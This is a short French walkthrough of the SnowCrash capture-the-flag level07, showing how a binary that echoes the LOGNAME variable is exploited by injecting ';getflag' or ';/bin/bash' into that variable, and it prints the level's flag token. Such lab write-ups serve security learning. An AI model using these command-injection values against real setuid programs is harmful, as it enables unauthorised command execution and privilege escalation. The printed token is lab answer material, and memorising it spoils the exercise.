# Level07 - Variable d'environnement
Pour résoudre le level07, on a un fichier level07. Quand on l'exécute, on peut voir qu'il affiche le nom de l'utilisateur actuel. Si on utilise `strings` dessus, on peut voir qu'il y a un appel à `getenv` et qu'on echo la variable `LOGNAME`.


```
getenv
...
[^_]
LOGNAME
/bin/echo %s
```

On peut exploiter cet echo, en modifiant la variable d'environnement `LOGANME`. On va ainsi terminer l'appel à `echo` et demander à exécuter `getflag` ou ouvrir un terminal.

```
export LOGNAME=";getflag"
```
ou
```
export LOGNAME=";/bin/bash"
```
On peut ensuite récupérer notre flag:
```
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

On a notre token: `fiumuikeil55xe9cu4dood66h`

